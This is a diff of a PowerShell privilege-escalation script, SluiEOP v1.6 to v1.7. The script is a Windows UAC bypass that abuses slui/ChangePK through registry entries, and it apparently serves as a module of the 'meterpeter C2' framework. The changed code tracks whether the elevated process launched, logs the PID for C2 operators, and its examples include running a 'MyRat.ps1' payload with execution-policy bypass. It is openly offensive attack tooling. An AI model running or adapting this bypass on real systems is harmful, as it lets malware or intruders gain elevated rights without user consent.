@@ -7,7 +7,7 @@
    EOP Disclosure By: @mattharr0ey
    Required Dependencies: none
    Optional Dependencies: none
-   PS Script Dev Version: v1.6
+   PS Script Dev Version: v1.7
 
 .DESCRIPTION
    How does Slui UAC bypass work? There is a tool named ChangePK in System32 has a service that opens a window (for you)
@@ -48,7 +48,7 @@
 
 
 $Command = $Null
-$DetailedInfo = $False
+$Success = $False
 $param1 = $args[0] # User Inputs [<arguments>]
 If(-not($param1) -or $param1 -eq $null){
    $Command = "$env:WINDIR\System32\cmd.exe"
@@ -65,10 +65,9 @@ If($CheckVuln -eq $True){
 
    ## For those who run SluiEOP outside meterpeter C2
    If(-not(Test-Path "$env:TMP\Update-KB4524147.ps1")){
-      Write-Host "SluiEOP v1.6 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
+      Write-Host "SluiEOP v1.7 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
       Write-Host "[+] Executing Command: '$Command'"
       # Output Detailed Info on screen
-      $DetailedInfo = $True
    }
 
    ### Add Entrys to Regedit { using powershell }
@@ -105,7 +104,8 @@ If($CheckVuln -eq $True){
       Author: @r00t-3xp10it
 
    .DESCRIPTION
-      Displays Detailed Info for those who run SluiEOP outside meterpeter C2
+      Displays Detailed Info (Arch|ProcessName|PID) for those who run SluiEOP
+      outside meterpeter C2 And 'Basic' Information to meterpeter C2 users.
 
    .EXAMPLE
       PS C:\> ./SluiEOP.ps1 "C:\Windows\System32\cmd.exe /c start notepad.exe"
@@ -115,45 +115,50 @@ If($CheckVuln -eq $True){
       AMD64        notepad      5543
    #>
 
-   If($DetailedInfo -eq $True){
-      If($Command -match ' ' -and $Command -match 'cmd'){
-         ## String: "C:\Windows\System32\cmd.exe /c start notepad.exe"
-         $ParsingData = $Command -Split(' ')
-         $ProcessName = $ParsingData|Select -Last 1 -EA SilentlyContinue
-         If($ProcessName -match '.exe'){
-            $ProcessName = $ProcessName -replace '.exe',''
-            $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
-         }Else{
-            $EOPID = "null"
-         }
-      }
-      ElseIf(-not($Command -match ' ') -and $Command -match '\\'){
-         ## String: "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe"
-         $ProcessName = Split-Path "$Command" -Leaf
-         If($ProcessName -match '.exe'){
-            $ProcessName = $ProcessName -replace '.exe',''
-            $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
-         }Else{
-            $EOPID = "null"
-         }
-      }
-      ElseIf($Command -match '^[powershell]' -and $Command -match ' ' -and $Command -match '.ps1' -or $Command -match '.bat' -or $Command -match '.py'){
-         ## String: "powershell -exec bypass -w 1 -File C:\Users\pedro\AppData\Local\Temp\MyRat.ps1"
-         $ParsingData = $Command -Split('\\')
-         $ProcessName = $ParsingData|Select -Last 1 -EA SilentlyContinue
+   If($Command -match ' ' -and $Command -match 'cmd'){
+      ## String: "C:\Windows\System32\cmd.exe /c start notepad.exe"
+      $ParsingData = $Command -Split(' ')
+      $ProcessName = $ParsingData|Select -Last 1 -EA SilentlyContinue
+      If($ProcessName -match '.exe'){
+         $ProcessName = $ProcessName -replace '.exe',''
+         $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
+         If($EOPID -match '[0-9]'){$Success = $True}
+      }Else{
          $EOPID = "null"
       }
-      Else{
-         ## String: "powershell.exe"
-         $ProcessName = Split-Path "$Command" -Leaf
-         If($ProcessName -match '.exe'){
-            $ProcessName = $ProcessName -replace '.exe',''
-            $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
-         }Else{
-            $EOPID = "null"
-         }
+   }
+   ElseIf(-not($Command -match ' ') -and $Command -match '\\'){
+      ## String: "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe"
+      $ProcessName = Split-Path "$Command" -Leaf
+      If($ProcessName -match '.exe'){
+         $ProcessName = $ProcessName -replace '.exe',''
+         $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
+         If($EOPID -match '[0-9]'){$Success = $True}
+      }Else{
+         $EOPID = "null"
       }
+   }
+   ElseIf($Command -match '^[powershell]' -and $Command -match ' ' -and $Command -match '.ps1' -or $Command -match '.bat' -or $Command -match '.py'){
+      ## String: "powershell -exec bypass -w 1 -File C:\Users\pedro\AppData\Local\Temp\MyRat.ps1"
+      $ParsingData = $Command -Split('\\')
+      $ProcessName = $ParsingData|Select -Last 1 -EA SilentlyContinue
+      $Success = $True
+      $EOPID = "null {script exec}"
+   }
+   Else{
+      ## String: "powershell.exe"
+      $ProcessName = Split-Path "$Command" -Leaf
+      If($ProcessName -match '.exe'){
+         $ProcessName = $ProcessName -replace '.exe',''
+         $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
+         If($EOPID -match '[0-9]'){$Success = $True}
+      }Else{
+         $EOPID = "null"
+      }
+   }
 
+   ## For those who run SluiEOP outside meterpeter C2
+   If(-not(Test-Path "$env:TMP\Update-KB4524147.ps1")){
       ## Build MY PSObject Table
       # IF executed outside meterpeter C2 framework
       $MYPSObjectTable = New-Object -TypeName PSObject
@@ -161,6 +166,13 @@ If($CheckVuln -eq $True){
       $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "ProcessName" -Value "$ProcessName"
       $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "PID" -Value "$EOPID"
       $MYPSObjectTable
+   }Else{
+      ## Build meterpeter Table
+      If($Success -eq $True){
+         echo "   system  success  Process PID returned: $EOPID" > $env:TMP\sLUIEop.log
+      }Else{
+         echo "   system  error?   Process PID not returned" > $env:TMP\sLUIEop.log
+      }
    }
 
 }Else{
